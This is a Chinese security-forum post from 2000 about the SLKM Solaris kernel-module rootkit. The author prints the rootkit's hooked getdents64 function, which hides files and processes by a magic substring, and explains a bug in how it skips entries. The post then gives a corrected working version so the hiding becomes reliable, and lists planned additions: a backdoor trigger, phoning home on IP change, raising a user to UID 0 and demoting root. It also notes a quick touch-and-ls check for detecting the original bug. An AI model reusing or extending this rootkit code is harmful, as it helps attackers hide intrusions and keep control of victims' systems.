---
title: "关于SLKM隐含目录的bug"
date: 2000-05-05T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-43"
---

[quack](https://www.xfocus.net/bbs/index.php?lang=cn&act=Profile&do=03&MID=5) (quack_at_xfocus.org)

关于SLKM隐含目录的bug


by blackcat<virtualcat@hotmail.com>


最近弄了一下SLKM，把那个隐含目录/文件名的BUG给补了一下，可能以前有人补过了吧？

其实问题很简单，我也弄不明白为何原作者不花一下心思，把它修一下，还在注解里抱怨

File System Driver有问题，看来也是一知半解。俺真的不信以前没人补过。


下面跟大家讲一下吧，对LLKM一样有效哦。


原理不用俺多说，简而言之就用自己的函数来替换getdents64(LLKM为getdents), 使得

那些使用这个系统调用的程序无法看到我们那些含有特征子串为文件名的目录/文件名。


    让我们来看一下那个newgetdents64做了些什么。


int newgetdents64(int fildes, struct dirent64 *buf, size_t nbyte)

{

    int ret, oldret, i, reclen;

    struct dirent64 *buf2, *buf3;


    /*先调用原来的系统调用*/

    oldret = (*oldgetdents64) (fildes, buf, nbyte);


    /*返回实际上driver在buf中写了多少字节，也就是所有entry长度的总和*/

    ret = oldret;


    /*如果返回值大于零--buf里有东西*/

    if (ret > 0) {

        /*在内核中申请ret那么长的内存空间，用来复制用户空间中的buf的内

          容哦。我们对含特殊子串的目录和文件名的过滤都要在这个buf2中

          进行*/

    buf2 = (struct dirent64 *) kmem_alloc(ret, KM_SLEEP);


        /*把用户空间的buf复制到内核空间的buf2, ret那么长*/

    copyin((char *) buf, (char *) buf2, ret);


        /*注意：buf3和buf2现在都指向申请到的那片内存的开始位置*/

    buf3 = buf2;


        /*i为buffer中剩下未处理的目录项的长度*/

    i = ret;


        /*处理直到buf2里的东西被处理完为止*/

    while (i > 0) {


            /*取buf3所指向的目录项长度*/

        reclen = buf3->d_reclen;


            /*剩下未处理的buffer长度减掉这个目录项的长度*/

        i -= reclen;


            /*如果文件名或者进程的程序名含有我们的特征子串，呵呵*/

        if ((strstr((char *) &(buf3->d_name), (char *) &magic) != NULL) ||

        check_for_process((char *) &(buf3->d_name))) {

#ifdef DEBUG

        cmn_err(CE_NOTE, "sitf: hiding file/process (%s)", buf3->d_name);

#endif

                /*如果不是最后一个目录项*/

        if (i != 0)

                    /*那么，来个内存搬家：把后面剩下的那些目录项拷贝

                      到前面来，注：buf3目前正指向我们的那个要隐含的

                      东东。这样一来后面的目录项就复盖掉我们的目录项了

                      达到了目的，到目前为止，一切都是好的。*/

            memmove(buf3, (char *) buf3 + buf3->d_reclen, i);

        else


                    /*否则，当前项为最后一项*/

            buf3->d_off = 1024;

                    /*有谁能告诉我1024这个Magic Number在这起什么做用？*/


                /*过滤掉了我们的目录项，应该从返回值中减掉这一项的长

                  度，不然的话，掉用它的应用成序可能会crash哦*/

        ret -= reclen;

        }


            /*这个if语句，真不应该在这出现*/

        if (buf3->d_reclen < 1) {

        ret -= i;

        i = 0;

        }


            /*这才是最重要的环节！！！

              如果buffer里还有剩下未处理的目录项，

              buf3指针将指向下一个。！@#$%

              看到问题了吗？

              如果当前处理的目录项不含有我们的特征子串

              那么buf3指针指向下一项--没问题

              但是如果含有呢？前面我们不是已经来个内存搬家了吗？

              还要往后移干嘛？乱移一通，和i的值不协调，不crash才怪呢？！

              难怪原作者在那抱怨呢。上面那个if就是用来胡乱修正返回值

              和i的值的。所以遇到问题不要抱怨，要多花点心思。

              真确的处理方法是，要在这里多加个判断来解决掉这个臭BUG*/

        if (i != 0)

        buf3 = (struct dirent64 *) ((char *) buf3 + buf3->d_reclen);

    }


        /*处理完所有的目录项，把它复制回到用户空间的buf中*/

    copyout((char *) buf2, (char *) buf, ret);


        /*把内存还给OS*/

    kmem_free(buf2, oldret);

    }

    return ret;

}


所以，也不是什么strstr函数不可靠的问题。而是算法上的错。那个“天才”的

if修补，你看到有多臭了吧。


这个BUG的发现不难，修正也不难。俺的大部分时间都花在分析它所导致的后果

上了，自找苦吃:)


显而易见的是：如果我们有两个相连的含有特征串的文件或目录，那么第二个

就不能够隐含；ls 至少不能看到含有特征串目录/文件名的子目录下的新建文件。

信不信由你。


所以如果你怀疑你的机子给Script Kiddies用了LKM，在那个可能的子目录下

touch AAA, 如果ls 看不到AAA，那么恭喜你了。


还有其他情况，要说清楚得要画图，这里就免了。


    至于如何修改，俺比较懒，就简单地多加一个布尔变量来判断就行了。至于

那个天才的if语句，就让它到别的地方去发挥作用吧。


    当然如果你有时间，可以考虑重写这个函数。


    下面是俺的简单修改。


int newgetdents64(int fildes, struct dirent64 *buf, size_t nbyte)

{

    int ret, oldret, i, reclen, bMovePointer;

    struct dirent64 *buf2, *buf3;


    oldret = (*oldgetdents64) (fildes, buf, nbyte);

    ret = oldret;


    if (ret > 0) {

        buf2 = (struct dirent64 *) kmem_alloc(ret, KM_SLEEP);

        copyin((char *) buf, (char *) buf2, ret);

        buf3 = buf2;


        i = ret;

        while (i > 0) {


                    bMovePointer = 1; /*需要下面的buf3指向下一项*/

            reclen = buf3->d_reclen;

            i -= reclen;

            if ((strstr((char *) &(buf3->d_name), (char *) &magic) != NULL) ||

                check_for_process((char *) &(buf3->d_name))) {

#ifdef DEBUG

                cmn_err(CE_NOTE, "sitf: hiding file/process (%s)", buf3->d_name);

#endif

                if (i != 0)

                {

                    memmove(buf3, (char *) buf3 + buf3->d_reclen, i);

                }

                else

                {

                    buf3->d_off = 1024;

                }

                ret -= reclen;

                bMovePointer = 0; /*buf3不要指向下一项*/

            }


            if (i != 0 && bMovePointer)

            {

                buf3 = (struct dirent64 *) ((char *) buf3 + buf3->d_reclen);

            }

        }


        copyout((char *) buf2, (char *) buf, ret);

        kmem_free(buf2, oldret);

    }


    return ret;

}


    俺正盘算着如何增加SLKM的功能，毕竟那是个人家试范的东西，离达到我

们实用的程度还有一段距离。有何建议，请各位不妨提一提。


    俺的初步设想是：

    1) 当我们在外面叫“籽麻开门！”

       应该会有“Sesami!sesami!”为我们开门哦。

    2) 当Victim换了IP/Domain Name再连上Internet时，

       会发报“黄河！黄河！我是长江！我是长江！...”

    3) 起码要有隐含提供给它的进程号功能

    4) 起码会把当前在线的某个用户用户ID，变成UID0

    5) 可以把当前在线的root降级。

    ......

    

    大家如果有什么好的建议，不妨提一提。


[http://www.xfocus.org](http://www.xfocus.org/)(安全焦点)
